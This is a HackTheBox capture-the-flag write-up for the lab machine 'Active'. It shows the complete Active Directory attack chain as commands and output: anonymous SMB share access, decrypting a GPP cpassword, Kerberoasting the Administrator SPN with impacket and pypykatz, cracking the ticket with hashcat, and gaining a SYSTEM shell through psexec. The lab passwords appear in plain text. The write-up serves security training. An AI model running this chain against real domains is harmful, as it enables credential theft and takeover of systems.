---
title: "HackTheBox - Active"
published: true
---

| Field            | Details                                                                                                                                                                         |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **OS**           | Windows                                                                                                                                                                         |
| **Difficulty**   | Easy                                                                                                                                                                            |
| **Release Date** | 2018-07-28                                                                                                                                                                      |
| **Pwned Date**   | 2026-06-29                                                                                                                                                                      |
| **Tags**         | `smb` `active directory` `group policy preferences` `cpassword` `gpp-decrypt` `ticket granting service` `kerberos` `ldap` `spn` `kerberoasting` `impacket` `pypykatz` `hashcat` |

## Summary

Active is an easy difficulty machine, where it's possible to gain privileges by exploiting features of the Active Directory environment.

## Reconnaissance

### Port scan

Run port scanning

```bash
python portscan.py --target <TARGET_IP>
```

This is a [custom tool](https://github.com/n-califano/sectools/blob/main/tools/common/portscan.py). If you want to run standard commands run

```bash
nmap -p- --min-rate 5000 -oN all_tcp_ports.txt <TARGET_IP>
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49162,49166,49169 -oN service_scan.txt <TARGET_IP>
```

```
[snip]
--- Detected services ---
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-28 08:14 -0400
Nmap scan report for 10.129.22.153
Host is up (0.025s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-28 12:14:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
[snip]
```

### SMB enumeration

Check if SMB allows anonymous access

```bash
smbclient -L //10.129.22.153 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.22.153 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The anonymous login works and uncovers two non-default potentially interesting shares: Replication and Users.

Check them out

```bash
smbclient //10.129.22.153/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                5217023 blocks of size 4096. 284833 blocks available
smb: \> cd active.htb
smb: \active.htb\> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 06:37:44 2018
  Policies                            D        0  Sat Jul 21 06:37:44 2018
  scripts                             D        0  Wed Jul 18 14:48:57 2018

                5217023 blocks of size 4096. 284833 blocks available
```

By the folder names is clear that these folders are related to the AD environment.

```bash
smbclient //10.129.22.153/Users -N
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Users share is not accessible anonymously, focus on Replication share.

Download the whole Replication share content locally

```bash
smbclient //10.129.22.153/Replication -N -c 'recurse ON; prompt OFF; mget *'
Anonymous login successful
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (1.2 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (27.8 KiloBytes/sec) (average 7.4 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (5.2 KiloBytes/sec) (average 6.9 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (10.6 KiloBytes/sec) (average 7.6 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (36.7 KiloBytes/sec) (average 11.7 KiloBytes/sec)
```

Folders 'scripts' and 'DfrsPrivate' are empty, only 'Policies' folder has some files.

The Policies\\{GUID}\ folders are shared directories containing critical data that needs to be replicated across all DCs.

Inspect the Groups.xml file

```bash
xmllint --format ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

The file defines a 'SVC_TGS' domain user. Notice that the cpassword attribute contains the encrypted password of the user.

This is a known vulnerability: because Microsoft published the encryption key years ago in their documentation, this password can be easily decrypted.

There are existing tools to perform the decryption, such as https://github.com/t0thkr1s/gpp-decrypt

Also, notice the name of the user (SVC_TGS) which is likely a service account for the kerberos ticket granting service.

### GPP decryption

Install the tool if you don't have it already (Kali should provide it by default)

```bash
pipx install gpp-decrypt
⚠️  Note: gpp-decrypt was already on your PATH at /usr/bin/gpp-decrypt
  installed package gpp-decrypt 2.0.0, installed using Python 3.13.12
  These apps are now globally available
    - gpp-decrypt
done! ✨ 🌟 ✨
```

Run the decrypt command

```bash
gpp-decrypt -f ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml

                              __                                __
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/
/___/  /_/    /_/                                /___/  /_/


[ • ] GPP-Decrypt v2.0.0 - Group Policy Preferences Password Decryptor
[ • ] Author: Kristof Toth (@t0thkr1s)

[ • ] Processing file: ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
[ ✓ ] Found 1 credential(s)

═══ Credential #1 ═══
[ • ] Type: User Account
[ • ] Username: active.htb\SVC_TGS
[ ✓ ] Password: GPPstillStandingStrong2k18ఌఌఌఌఌఌ
```

The actual password is **GPPstillStandingStrong2k18**. The ఌ chars are probably padding artifacts, ignore them.

### LDAP enumeration

Use your newfound credentials to perform ldap enumeration

```bash
ldapsearch -x -H ldap://<TARGET_IP> -D SVC_TGS@active.htb -w GPPstillStandingStrong2k18 -b "DC=active,DC=htb" "(objectClass=user)"
```

This command gives a lengthy output but the interesting line is the following

```
servicePrincipalName: active/CIFS:445
```

under the Administrator account.

This is not a default SPN: the admin account has been setup as a service account for something CIFS related.

When an account has a SPN it means the account is associated with a service.

Any authenticated domain user can request a kerberos service ticket for any SPN in the domain.

That ticket is encrypted with the service's account password hash.

So it's possible to request the ticket, save it and try to crack the hash offline.

This tecnique is named Kerberoasting.

In this specific case the Administrator account has a SPN so you can leverage the Kerberoasting tecnique to try cracking the Administrator's password.

## Access

### Kerberoasting

Add the following line to your /etc/hosts file, so your machine is able to resolve the active.htb domain

```bash
<TARGET_IP>   active.htb
```

Get the service ticket

```bash
impacket-getST -spn active/CIFS:445 active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Getting ST for user
[*] Saving ticket in SVC_TGS@active_CIFS:445@ACTIVE.HTB.ccache
```

The previous command saved the ticket in a file named 'SVC_TGS@active_CIFS:445@ACTIVE.HTB.ccache'

Extract the hash from the .ccache file and save it in a format you can feed to hashcat

```bash
pypykatz kerberos ccache roast SVC_TGS@active_CIFS:445@ACTIVE.HTB.ccache > hash.txt
```

Crack it with hashcat

```bash
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt.gz
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-penryn-QEMU Virtual CPU version 2.5+, 2948/5896 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 514 MB (5960 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 53357329
* Keyspace..: 14344385

$krb5tgs$23$*CIFS:445$ACTIVE.HTB$spn*$c37893220c19bdc6c7243493ca70532f$426dac81d13b32f8bce6d233a67ff8a70a8be4fa9c27f515038ddf3783de63672cd3b2213ac1a8a63af3f72f4078abfa6be56eb8197d680e6d3390f4150d703920489ca368ac7e9c569e2a71cb38a8f30846a02b71e89b3b248f03c58cb0baff92f9b5ee5a3753f1251990b5174c81de477b656ef12231248d71a88ea8393849f67d4049fa3f6b2907504118311150e24e3a3ea3c364572fe8dfe6e2b1f70cf39084bb60d3606411c4ca8944c299bad941c815e967621a3e257afb1ed354482005c41037404b97988b12db492649ae1536465ba8edf57de440dcf6f235fbcfbeab2d0de2ade27e8cb9e7e209d7ee7cd1459f660f525d59a143f9f2fc14ba598102c8c5fb30e7748a0305c77578ec12415430e7371f015b93259c4c262ca41dcb42ee67991b7e816adeb8673d139adac264676f4b26b49db883dd5832c07ca8c31e2ae76bc7cb93c81bbae690cda837d424d967fa00974aaab97ed4bd497ce12228913f4cd9b2d2557fe3389aec2b7d26e774959167010fa871dfe9bd61a83a14784958fcf4861ced3f620eb45f9302d3f65f8877764a1882c2bc8073a28fc12a0c50e063e34967029243a655a9189f5c7effacdd5e0682355d554eaeb7ec8885f762bcabd3c031ac09fc42f40fa6bfa06a73ec31e1b8c62313bb3a9c56f710ee327278c7d9fe1b9c51374d5a894f74118a2c85afe0b2036763f403150d7eba5d69f2e34976477081e971173c3d0032bd3cc9d4e11ea24039792f0cd64258be552b1d6a4469a8ef98b510d853b41e9f9b3d49be7d1a49e22490b5d0b70ca5d443fc2317ea7d1ede76a624e91c6cbf3e5ff685ffd51e036418946dec793ae6a3893c719d1dd7ed2bdb2074441212ecdb400126c0eb25c0ea5532429191428ff92ef186ce9c4c5dd883b778af0bd6a8df0f3f70f6821db1dafd48e5fc030acacaea21cd7b7be9aa257afbacf1048dfc71f7ed5721e14a77403408ff4a4f12792f2cf8bf6718c7ebdbc53a53d230518d2a26797a2c8386ba2f74f3a96f7fb86d7e8dd4ed11d65a3e2dad05f2bedc8afb4a589696cfccca33b446627f29979441a1f921dd5dbeb003472ac4d13041b9f99a0c7d40623f94cda420e894c36d26e7980cfff21e06db390311bb7083a81fe0758a374f81f79a0a6556183accb1162b87a0e3ff814ed74080f6d8cf8a68addc1bc7968f7ce69ce041a28aed71b46ac05addc5c3648393c0638d97d9c66042638d35b20adbc3ed407c7278aa:Ticketmaster1968

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*CIFS:445$ACTIVE.HTB$spn*$c37893220c19b...7278aa
Time.Started.....: Sun Jun 28 12:48:05 2026 (6 secs)
Time.Estimated...: Sun Jun 28 12:48:11 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1697.4 kH/s (3.23ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10543104/14344385 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Tioncurtis23 -> Teague51

Started: Sun Jun 28 12:47:45 2026
Stopped: Sun Jun 28 12:48:12 2026
```

Hashcat managed to crack the password, which is **Ticketmaster1968**.

Use the Administrator's password to get a shell with impacket

```bash
impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on active.htb.....
[*] Found writable share ADMIN$
[*] Uploading file zYBaNcny.exe
[*] Opening SVCManager on active.htb.....
[*] Creating service TfkG on active.htb.....
[*] Starting service TfkG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Got system access.
